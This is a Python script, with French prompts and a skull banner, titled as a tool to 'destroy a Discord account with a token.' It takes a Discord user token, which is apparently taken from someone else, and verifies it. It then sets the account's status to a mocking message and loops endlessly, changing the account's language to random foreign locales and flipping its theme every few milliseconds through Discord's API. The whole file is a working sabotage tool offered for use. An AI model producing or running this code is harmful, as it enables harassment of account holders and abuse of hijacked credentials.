import requests
import time
from itertools import cycle
import random

from colorama import Fore, Back, Style, init
import os

os.system('color 4')

menu = f"""
                                              @@@@                @%@@                                      
                                       @@@@@@@@@@@@               @@@@@@@@@@%                               
                                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                         
                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
                               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                       
                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     
                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                    
                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                   
                          %@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@%                  
                          %@@@@@@@@@@@@@@@@        %@@@@@@@@@@@%@        @@@@@@@@@@@@@@@@@                  
                          %@@@@@@@@@@@@@@@          @@@@@@@@@@@@          @@@@@@@@@@@@@@@%                  
                         %@@@@@@@@@@@@@@@@          @@@@@@@@@@@%          %@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@%         @@@@@@@@@@@%         %@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@      %@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@%                 
                         %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                           @%@@@@@@@@@@@@@%@@   @@@@%@@@@@@@@@%%%@%@@  @@@@@@@@@@@@@@@@@@                   
                              @@%@@@@@@@@@@@@@                        @%@@@@@@@@@@@%@@                      
                                   @%@@@@@@@                            @@@@@@%%@                           
                                         @@                              @@   
                                         
                                    ╔═══════════════════════════════════════════╗
                                    ║ Détruire Un Compte Discord Avec Un Token  ║
                                    ╚═══════════════════════════════════════════╝           
"""

print(menu)

def choisir_token_discord():
    return input("Veuillez entrer un token Discord -> ")

def erreur_token():
    print("Token Discord invalide ou erreur lors de la récupération des informations utilisateur.")
    exit()

statut_defaut = "Ton compte est mort 🤡 | MC"

try:
    token = choisir_token_discord()

    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    reponse = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if reponse.status_code != 200:
        erreur_token()

    statut_personnalise = input("Entrez un message qui sera en statut du compte (laisser vide pour le statut par défaut) -> ")

    if not statut_personnalise.strip():
        statut_personnalise = statut_defaut

    themes = cycle(["light", "dark"])

    statut_custom_perso = {"custom_status": {"text": statut_personnalise}}
    try:
        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=statut_custom_perso)
        print(f"Statut appliqué | Statut Discord: {statut_personnalise}")
    except Exception as e:
        print(f"Erreur lors du changement de statut: {e} | Statut Discord: {statut_personnalise}")

    while True:
        for _ in range(1000):
            try:
                langue_aleatoire = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                parametre = {'locale': langue_aleatoire}
                try:
                    requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=parametre)
                    print(f"Langue changée: {langue_aleatoire}")
                except Exception as e:
                    print(f"Erreur lors du changement de langue: {e} | Langue: {langue_aleatoire}")
                
                theme = next(themes)
                parametre = {'theme': theme}
                try:
                    requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=parametre)
                    print(f"Thème changé: {theme}")
                except Exception as e:
                    print(f"Erreur lors du changement de thème: {e} | Thème: {theme}")

                time.sleep(0.01)

            except Exception as e:
                print(f"Erreur lors du changement de langue ou de thème : {e}")

except Exception as e:
    print(f"Erreur générale : {e}")
